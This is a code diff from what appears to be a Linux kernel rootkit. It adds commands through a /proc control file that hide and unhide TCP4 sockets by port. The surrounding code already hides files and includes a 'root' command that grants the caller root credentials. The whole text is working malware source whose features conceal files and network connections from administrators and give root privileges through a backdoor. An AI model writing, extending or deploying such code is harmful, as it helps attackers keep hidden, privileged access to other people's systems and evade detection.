@@ -4,6 +4,7 @@
 #include "helper.h"
 #include "logging.h"
 #include "prochider.h"
+#include "sockethider.h"
 
 #include <linux/proc_fs.h>
 #include <linux/ptrace.h>
@@ -51,6 +52,9 @@ static int procfile_read(struct seq_file *m, void *v)
         "   echo hf FILE > /proc/" THOR_PROCFILE " (hide file FILE)\n"\
         "   echo uf FILE > /proc/" THOR_PROCFILE " (unhide file FILE)\n"\
         "   echo ufa > /proc/" THOR_PROCFILE " (unhide all files)\n"\
+        "   echo ht4s PORT > /proc/" THOR_PROCFILE " (hide tcp4 socket)\n"\
+        "   echo ut4s PORT > /proc/" THOR_PROCFILE " (unhide tcp4 socket)\n"\
+        "   echo ut4a > /proc/" THOR_PROCFILE " (unhide all tcp4 sockets)\n"\
         "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
     return 0;
 }
@@ -77,6 +81,20 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         clear_file_list();
     } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
         remove_from_file_list(buffer + 3, count - 3);
+    } else if(strncmp(buffer, "ht4s ", MIN(5, count)) == 0) {
+        long port;
+        char s_port[12];
+        strncpy(s_port, buffer+5, MIN(12, count - 5));
+        kstrtol(s_port, 10, &port);
+        add_to_tcp4_list((int)port);
+    } else if(strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
+        long port;
+        char s_port[12];
+        strncpy(s_port, buffer+5, MIN(12, count - 5));
+        kstrtol(s_port, 10, &port);
+        remove_from_tcp4_list((int)port);
+    } else if(strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
+        clear_tcp4_list();
     } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
         struct cred *credentials = prepare_creds();
         credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
